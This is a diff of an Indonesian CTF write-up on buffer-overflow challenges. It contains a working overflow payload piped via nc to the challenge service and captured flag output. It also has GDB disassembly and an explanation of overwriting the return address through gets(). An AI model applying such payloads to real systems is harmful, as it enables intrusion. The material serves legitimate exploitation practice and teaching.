@@ -4,7 +4,7 @@
 
 Diberikan file ELF 32-bit not stripped dan service ```nc asgama.web.id 40203```.
 
-```
+```bash
 $ file buf1 
 buf1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=66a2a0cfb02b03a6abf1e65146da2739e8b17bdd, not stripped
 ```
@@ -55,7 +55,7 @@ Langsung saja wkwk..
 Command : ```python -c 'print "A"*128 + "\x31\x73\x37\x13"' | nc asgama.web.id 40203```
 
 Result : 
-```
+```bash
 $ python -c 'print "A"*128 + "\x31\x73\x37\x13"' | nc asgama.web.id 40203
 GamaCTF{BufF3rR__0vErf10W__EZ}
 ```
@@ -66,14 +66,14 @@ Flag : ```GamaCTF{BufF3rR__0vErf10W__EZ}```
 Diberikan File ELF 32-bit not stripped dan service ```nc asgama.web.id 40202```
 
 Command : ```file buf2```
-```
+```bash
 $ file buf2 
 buf2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=422a2c2391911b03f182ed6a8a2b65ca200f276c, not stripped
 ```
 Oke, langsung lihat disassemble fungsi ```main``` dengan GDB+Peda.
 
 Fungsi ```main```:
-```
+```bash
 gdb-peda$ pdisas main
 Dump of assembler code for function main:
    0x0804855d <+0>:	lea    ecx,[esp+0x4]
@@ -98,7 +98,7 @@ End of assembler dump.
 Ternyata fungsi ```main``` memanggil fungsi ```hah``` yang menggunakan ```gets``` untuk mengambil inputan, sedangkan ```gets``` sendiri memiliki vulnerable yang sangat berbahaya, sehingga kita bisa mengubah return address ke fungsi tujuan kita untuk mendapat flag.
 
 Fungsi ```hah```:
-```
+```bash
 gdb-peda$ pdisas hah
 Dump of assembler code for function hah:
    0x08048545 <+0>:	push   ebp
